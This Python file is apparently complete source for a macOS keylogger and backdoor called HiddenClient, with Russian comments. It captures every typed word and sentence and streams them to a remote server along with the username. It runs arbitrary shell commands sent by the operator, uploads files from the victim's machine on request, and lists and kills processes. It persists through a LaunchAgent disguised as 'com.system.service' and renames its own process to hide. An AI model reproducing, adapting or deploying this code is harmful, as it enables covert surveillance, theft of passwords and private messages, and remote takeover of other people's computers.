import os
import socket
import json
import threading
from pynput import keyboard
import sys
import time
from datetime import datetime
import logging
import platform
import argparse
import psutil
import subprocess
from PIL import Image
import io
import locale

locale.getpreferredencoding = lambda: 'UTF-8'

HOST = "0.0.0.0"  
PORT = 3895        

class HiddenClient:
    def __init__(self, server_host = HOST, server_port = PORT):
        self.server_host = server_host
        self.server_port = server_port
        self.socket = None
        self.running = False
        self.reconnect_delay = 5  
        self.word_buffer = "" 
        self.predlozhenie_buffer = "" 
        self.current_dir = os.getcwd()  
        self.setup_logging()
        self.connection_thread = None
        self.command_thread = None

    def setup_logging(self):
        
        log_dir = os.path.join(os.path.expanduser("~"), "Library", "Logs")
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)
        
        log_file = os.path.join(log_dir, "system.log")
        logging.basicConfig(
            filename=log_file,
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )

    def connect_to_server(self):
        
        try:
            if self.socket:
                try:
                    self.socket.close() 
                except:
                    pass
                self.socket = None
            
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(5)  
            self.socket.connect((self.server_host, self.server_port))
            
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            logging.info(f"Подключено к серверу {self.server_host}:{self.server_port}")
            return True
        except Exception as e:
            logging.error(f"Ошибка подключения к серверу: {e}")
            return False

    def connection_monitor(self):

        while self.running:
            try:
                if not self.socket:
                    if not self.connect_to_server():
                        time.sleep(self.reconnect_delay)
                        continue

                else:
                    
                    try:
                        self.socket.send(b'')
                    except:
                        logging.warning("Потеряно соединение с сервером, переподключение...")
                        self.socket = None
                        if not self.connect_to_server():
                            time.sleep(self.reconnect_delay)
            except Exception as e:
                logging.error(f"Ошибка при мониторинге соединения: {e}")
                self.socket = None
            time.sleep(1)
            
    def on_press(self, key):
        
        try:
            if self.socket:
                if hasattr(key, 'char') and key.char is not None:
                    if key.char.isprintable() and not key.char.isspace():
                        self.word_buffer += key.char
                    elif key.char == ' ' and self.word_buffer:
                        self.send_word_buffer()
                        
                        if self.predlozhenie_buffer:
                            self.predlozhenie_buffer += ' '
                        self.predlozhenie_buffer += self.word_buffer_last_sent
                elif key == keyboard.Key.space and self.word_buffer:
                    self.send_word_buffer()
                    if self.predlozhenie_buffer:
                        self.predlozhenie_buffer += ' '
                    self.predlozhenie_buffer += self.word_buffer_last_sent
                elif key == keyboard.Key.enter:
                    
                    if self.word_buffer:
                        self.send_word_buffer()
                        if self.predlozhenie_buffer:
                            self.predlozhenie_buffer += ' '
                        self.predlozhenie_buffer += self.word_buffer_last_sent
                    
                    if self.predlozhenie_buffer.strip():
                        self.send_predlozhenie_buffer()
                elif key == keyboard.Key.backspace:
                    self.word_buffer = self.word_buffer[:-1]
        except Exception as e:
            logging.error(f"Ошибка отправки данных: {e}")
            self.reconnect()

    def send_word_buffer(self):
        self.word_buffer_last_sent = self.word_buffer 
        key_data = {
            'key': self.word_buffer,
            'timestamp': datetime.now().isoformat(),
            'system': platform.system(),
            'username': os.getlogin()
        }
        try:
            message = json.dumps(key_data, ensure_ascii=False) + '\n'
            self.socket.send(message.encode('utf-8'))
        except Exception as e:
            logging.error(f"Ошибка отправки данных: {e}")
        self.word_buffer = ""

    def send_predlozhenie_buffer(self):
        key_data = {
            'key': self.predlozhenie_buffer.strip(),
            'timestamp': datetime.now().isoformat(),
            'system': platform.system(),
            'username': os.getlogin()
        }
        try:
            message = json.dumps(key_data, ensure_ascii=False) + '\n'
            self.socket.send(message.encode('utf-8'))
        except Exception as e:
            logging.error(f"Ошибка отправки данных: {e}")
        self.predlozhenie_buffer = ""

    def reconnect(self):
        try:
            if self.socket:
                self.socket.close()
        except:
            pass
        self.connect_to_server()

    def listen_for_commands(self):
        while self.running:
            try:
                if not self.socket:
                    time.sleep(1)
                    continue
                    
                data = self.socket.recv(4096)
                if not data:
                    self.socket = None
                    continue
                    
                try:
                    cmd = data.decode('utf-8').strip()
                    if cmd.startswith('shell:'):
                        self.execute_shell_command(cmd[6:])
                except Exception as e:
                    logging.error(f"Ошибка обработки команды: {e}")
            except socket.timeout:
                continue
            except Exception as e:
                logging.error(f"Ошибка получения команды: {e}")
                self.socket = None

    def execute_shell_command(self, command):
        try:
            import subprocess
            
            if command.startswith('cd '):
                new_dir = command[3:].strip()
                if new_dir == '..':
                    self.current_dir = os.path.dirname(self.current_dir)
                else:
                    self.current_dir = os.path.join(self.current_dir, new_dir)
                output = f"Текущая директория: {self.current_dir}"
            elif command.startswith('download '):
                
                file_path = command[9:].strip()
                full_path = os.path.join(self.current_dir, file_path)
                
                if os.path.exists(full_path) and os.path.isfile(full_path):
                    try:
                        
                        if file_path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                            
                            with Image.open(full_path) as img:
                                
                                if img.mode in ('RGBA', 'P'):
                                    img = img.convert('RGB')
                                
                                
                                output_buffer = io.BytesIO()
                                
                                
                                img.save(output_buffer, format='JPEG', quality=60, optimize=True) #60 проц качество фотки
                                output_buffer.seek(0)
                                
                                
                                file_info = {
                                    'type': 'file_info',
                                    'file_name': os.path.basename(full_path),
                                    'file_size': output_buffer.getbuffer().nbytes,
                                    'timestamp': datetime.now().isoformat(),
                                    'system': platform.system(),
                                    'username': os.getlogin()
                                }
                                self.socket.send((json.dumps(file_info) + '\n').encode('utf-8'))
                                
                                
                                while True:
                                    chunk = output_buffer.read(8192)
                                    if not chunk:
                                        break
                                    self.socket.send(chunk)
                        else:
                            
                            file_info = {
                                'type': 'file_info',
                                'file_name': os.path.basename(full_path),
                                'file_size': os.path.getsize(full_path),
                                'timestamp': datetime.now().isoformat(),
                                'system': platform.system(),
                                'username': os.getlogin()
                            }
                            self.socket.send((json.dumps(file_info) + '\n').encode('utf-8'))
                            
                            with open(full_path, 'rb') as f:
                                while True:
                                    chunk = f.read(8192)
                                    if not chunk:
                                        break
                                    self.socket.send(chunk)
                        

                        end_marker = {
                            'type': 'file_end',
                            'file_name': os.path.basename(full_path)
                        }
                        self.socket.send((json.dumps(end_marker) + '\n').encode('utf-8'))
                        output = f"Файл {file_path} успешно отправлен"
                    except Exception as e:
                        output = f"ошибка при чтении файла: {e}"
                else:
                    output = f"Файл {file_path} не найден"
            elif command.strip() == 'ps aux':
                
                process_names = set()
                for proc in psutil.process_iter(['name', 'username', 'exe', 'cmdline', 'pid']):
                    try:
                        pinfo = proc.info
                        name = pinfo['name'].lower()  
                        username = pinfo['username']
                        exe = str(pinfo['exe']).lower() if pinfo['exe'] else ''  
                        cmdline = ' '.join(str(x).lower() for x in pinfo['cmdline'] if x) if pinfo['cmdline'] else ''  
                        pid = pinfo['pid']
                        
                        if username == 'root' or username == 'system':
                            continue
                            
                        if name in ['ps', 'grep', 'sh', 'bash', 'launchd', 'kernel_task', 'loginwindow', 'usereventagent']:
                            continue
                            
                        if not name or name.startswith('['):
                            continue
                            
                        
                        if any(x in name or x in exe or x in cmdline for x in ['chrome', 'google-chrome']):
                            name = f'chrome (браузер) [PID: {pid}]'
                        elif any(x in name or x in exe or x in cmdline for x in ['safari', 'safari.app']):
                            name = f'safari (браузер) [PID: {pid}]'
                        elif any(x in name or x in exe or x in cmdline for x in ['firefox', 'firefox.app']):
                            name = f'firefox (браузер) [PID: {pid}]'
                        elif any(x in name or x in exe or x in cmdline for x in ['discord', 'discord.app']):
                            name = f'discord (соц сеть) [PID: {pid}]'
                        elif any(x in name or x in exe or x in cmdline for x in ['cursor', 'cursor.app']):
                            name = f'cursor (программирование) [PID: {pid}]'
                        elif any(x in name or x in exe or x in cmdline for x in ['telegram', 'telegram.app']):
                            name = f'телеграм мм (соц сеть) [PID: {pid}]'
                        elif any(x in name or x in exe or x in cmdline for x in ['code', 'vscode', 'visual studio code']):
                            name = f'vscode (программирование) [PID: {pid}]'
                        elif any(x in name or x in exe or x in cmdline for x in ['word', 'microsoft word']):
                            name = f'word (документы) [PID: {pid}]'
                        elif any(x in name or x in exe or x in cmdline for x in ['excel', 'microsoft excel']):
                            name = f'excel (документы таблицы) [PID: {pid}]'
                        elif any(x in name or x in exe or x in cmdline for x in ['vk', 'vk.app']):
                            name = f'VK вк (соц сеть) [PID: {pid}]'
                        else:
                            
                            name = f'{name} [PID: {pid}]'
                            
                        if name and len(name) > 1:
                            process_names.add(f"-{name}")
                            
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        continue
                
                output = '\n'.join(sorted(process_names))
                
            elif command.startswith('kill_process '):

                process_info = command[12:].strip()
                try:
                    
                    pid = int(process_info.split('[PID: ')[1].split(']')[0])
                    
                    os.kill(pid, 9)  
                    output = f"Процесс {process_info} остановлен"
                except Exception as e:
                    output = f"окшибка при остановке процесса: {e}"
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=self.current_dir)
                output = result.stdout + result.stderr
            data = {
                'shell_result': output[-4000:],  
                'timestamp': datetime.now().isoformat(),
                'system': platform.system(),
                'username': os.getlogin()
            }
            message = json.dumps(data) + '\n'
            self.socket.send(message.encode('utf-8'))
        except Exception as e:
            data = {
                'shell_result': f'Ошибка выполнения: {e}',
                'timestamp': datetime.now().isoformat(),
                'system': platform.system(),
                'username': os.getlogin()
            }
            message = json.dumps(data) + '\n'
            self.socket.send(message.encode('utf-8'))

    def run(self):

        self.running = True
        
      
        self.connection_thread = threading.Thread(target=self.connection_monitor)
        self.connection_thread.daemon = True
        self.connection_thread.start()
        
       
        self.command_thread = threading.Thread(target=self.listen_for_commands)
        self.command_thread.daemon = True
        self.command_thread.start()
        
        with keyboard.Listener(on_press=self.on_press) as listener:
            while self.running:
                try:
                    time.sleep(1)
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    logging.error(f"Ошибка в основном цикле: {e}")

    def stop(self):
       
        self.running = False
        try:
            if self.socket:
                self.socket.close()
        except:
            pass
        if self.connection_thread:
            self.connection_thread.join(timeout=1)
        if self.command_thread:
            self.command_thread.join(timeout=1)

def add_to_startup():

    try:
        
        launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
        if not os.path.exists(launch_agents_dir):
            os.makedirs(launch_agents_dir)
        
        plist_path = os.path.join(launch_agents_dir, "com.system.service.plist")
        script_path = os.path.abspath(sys.argv[0])
        
        plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.service</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{script_path}</string>
        <string>--daemon</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>'''
        
        with open(plist_path, 'w') as f:
            f.write(plist_content)
        
        
        os.system(f'launchctl load {plist_path}')
        
        logging.info("Программа добавлена в автозагрузку MacOS")
    except Exception as e:
        logging.error(f"Ошибка добавления в автозагрузку: {e}")

def hide_process():
    
    try:
        
        current_process = psutil.Process()
        current_process.name("whtmee")
        logging.info("Процесс скрыт")
    except Exception as e:
        logging.error(f"Ошибка скрытия процесса: {e}")

def main():
    parser = argparse.ArgumentParser(description='скрытый клиент для мониторинга нажатий клавиш')
    parser.add_argument('--daemon', action='store_true', help='pапуск в фоновом режиме')
    parser.add_argument('--host', default=HOST, help='IP-адрес сервера')
    parser.add_argument('--port', type=int, default=PORT, help='порт сервера')
    parser.add_argument('--install', action='store_true', help='установить в автозагрузку')
    args = parser.parse_args()

    if args.install:
        add_to_startup()
        hide_process()
        sys.exit(0)

    if args.daemon:
        
        subprocess.Popen([sys.executable, __file__, "--host", args.host, "--port", str(args.port)])
        sys.exit(0)

    
    client = HiddenClient(args.host, args.port)
    try:
        client.run()
    except KeyboardInterrupt:
        client.stop()

if __name__ == "__main__":
    
    client = HiddenClient()
    try:
        client.run()
    except KeyboardInterrupt:
        client.stop() 